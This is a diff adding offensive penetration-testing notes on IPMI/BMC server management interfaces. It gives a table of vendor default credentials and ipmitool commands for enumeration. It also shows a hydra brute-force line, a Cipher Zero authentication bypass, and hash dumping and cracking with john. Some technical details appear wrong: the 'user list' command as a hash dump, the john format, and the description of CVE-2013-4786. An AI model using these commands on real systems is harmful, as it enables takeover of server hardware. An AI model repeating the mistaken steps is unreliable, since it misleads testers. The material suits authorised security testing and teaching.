@@ -142,3 +142,95 @@ Command Overview:
 * -H <target_ip>: Target IP address.
 * -U <username> and -P <password>: Credentials (try defaults like admin/admin).
 
+The most common way of exploiting IPMI/BMC interfaces is attempting to use common passwords against the device. If nmap has fingerprinted the device, attempt the username/password combinations from the list below:
+
+| **Username**      | **Password**     | **Device/Brand**                   |
+|--------------------|------------------|-------------------------------------|
+| `admin`           | `admin`          | Generic/default                     |
+| `admin`           | `password`       | Generic/default                     |
+| `ADMIN`           | `ADMIN`          | Generic/default (case-sensitive)    |
+| `root`            | `calvin`         | Dell iDRAC                          |
+| `Administrator`   | `password`       | HP iLO                              |
+| `root`            | `superuser`      | Supermicro IPMI                     |
+| `ADMIN`           | `PASS`           | Fujitsu iRMC                        |
+| `root`            | `root`           | Generic/default                     |
+| `admin`           | `0000`           | Generic/default                     |
+| `admin`           | `1234`           | Generic/default                     |
+| `admin`           | `changeme`       | Cisco UCS/IPMI                      |
+| `admin`           | `huawei`         | Huawei iBMC                         |
+| `admin`           | `!admin`         | Lenovo XClarity Controller (XCC)    |
+| `ADMIN`           | `12345`          | Asus ASMB                           |
+| `root`            | `toor`           | Some legacy systems                 |
+
+To query system information using the `fru` command:
+
+```bash
+ipmitool -I lanplus -H <target_ip> -U <username> -P <password> fru
+```
+
+The command retrieves the "Field Replaceable Unit" (FRU) information, which may contain hardware details such as:
+
+* Manufacturer
+* Model
+* Serial Numbers
+
+List all sensor information:
+
+```bash
+ipmitool -I lanplus -H <target_ip> -U <username> -P <password> sensor
+```
+
+Some IPMI interfaces allow the dumping of the System Event Log (SEL), which may contain hardware faults or configuration details:
+
+```bash
+ipmitool -I lanplus -H <target_ip> -U <username> -P <password> sel list
+```
+
+##### Bruteforcing IPMI/BMC Credentials Hydra
+
+The tool `hydra` within Kali Linux and other distros can be used to bruteforce the username and password used to login to the system. Specifying `-L` for a list of usernames in a text file and `-P` for a list of passwords in a text file:
+
+```bash
+hydra -L usernames.txt -P passwords.txt <target_ip> ipmi
+```
+
+##### IPMI Cypher 0 Authentication Bypass
+
+Some IPMI implementations allow "Cipher Zero," which permits authentication without a password.
+
+Nmap can detect IPMI/BMC devices that are vulnerable using the `ipmi-cipher-zero` script:
+
+```bash
+nmap --script ipmi-cipher-zero -p 623 <target_ip>
+```
+
+If vulnerable, it can be exploited using `ipmitool`, by supplying `-C 0` as part of the command line arguments, which tells it to use Cypher 0:
+
+```bash
+ipmitool -I lanplus -C 0 -H <target_ip> -U <username> chassis status
+```
+
+##### Dumping Password Hashes `ipmitool`
+
+IPMI allows dumping password hashes (e.g., for user root). These hashes can be cracked offline.
+
+* ipmitool to dump hashes:
+
+```bash
+ipmitool -I lanplus -H <target_ip> -U <username> -P <password> user list
+```
+
+The tool johntheripper can be used to crack the hashes, copying the hashes into a file:
+
+```bash
+john --format=raw-sha1 hashfile.txt --wordlist=/path/to/password/list.txt
+```
+
+ #### IPMI/BMC Known CVE's
+
+* CVE-2018-10072: Authentication bypass in Supermicro BMC.
+* CVE-2019-6260: ASPEED AST2400/AST2500 BMC SoC arbitrary code execution.
+* CVE-2021-26722: HP iLO 4 remote code execution.
+* CVE-2013-4786: Supermicro IPMI RCE (Metasploit Module Available)
+
+
